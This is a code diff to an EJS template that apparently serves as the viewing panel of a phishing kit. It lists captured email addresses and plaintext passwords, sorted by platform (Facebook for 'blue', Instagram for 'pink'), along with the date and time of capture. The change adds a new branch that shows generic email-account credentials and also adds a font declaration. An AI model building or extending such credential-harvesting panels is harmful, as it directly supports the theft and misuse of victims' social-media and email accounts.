@@ -11,6 +11,10 @@
             padding: 0;
             margin: 0;
         }
+        @font-face {
+    font-family: 'Poppins';
+    src: url('./fonts/Poppins-Regular.ttf');
+}
         body{
             padding-bottom: 5%;
             height: 100vh;
@@ -59,17 +63,17 @@
             <h4>Account Details</h4>
             <div class="data-container">
                 <% for (let i = 0; i < result.length; i++) { %>
-                    <% if (result[i]['AccountType'] == 'blue') {%>
-                    <div class="content">
-                        <ul id="data-list">
-                            <li class="list-item">Facebook</li>
-                            <li class="list-item">Email Adress: <%= result[i]['Email address'] %></li>
-                            <li class="list-item"> Password: <%= result[i]['Password'] %></li>
-                            <li class="list-item">Date: <%= result[i]['Date'] %></li>
-                            <li class="list-item"> Time: <%= result[i]['Time'] %></li>
-                        </ul>
-                    </div>
-                    <%}else {%>
+                    <% if (result[i]['AccountType'] == 'blue') { %>
+                        <div class="content">
+                            <ul id="data-list">
+                                <li class="list-item">Facebook</li>
+                                <li class="list-item">Email Adress: <%= result[i]['Email address'] %></li>
+                                <li class="list-item"> Password: <%= result[i]['Password'] %></li>
+                                <li class="list-item">Date: <%= result[i]['Date'] %></li>
+                                <li class="list-item"> Time: <%= result[i]['Time'] %></li>
+                            </ul>
+                        </div>
+                    <% } else if (result[i]['AccountType'] == 'pink') { %>
                         <div class="content">
                             <ul id="data-list">
                                 <li class="list-item">Instagram</li>
@@ -79,8 +83,19 @@
                                 <li class="list-item"> Time: <%= result[i]['Time'] %></li>
                             </ul>
                         </div>
-                    <%}%>
-                <% } %>                             
+                    <% } else { %>
+                        <div class="content">
+                            <ul id="data-list">
+                                <li class="list-item">Email Adress</li>
+                                <li class="list-item">Email Adress: <%= result[i]['Email address'] %></li>
+                                <li class="list-item"> Password: <%= result[i]['Password'] %></li>
+                                <li class="list-item">Date: <%= result[i]['Date'] %></li>
+                                <li class="list-item"> Time: <%= result[i]['Time'] %></li>
+                            </ul>
+                        </div>
+                    <% } %>
+                <% } %>
+                                      
         </div>
         </div>
     </div>
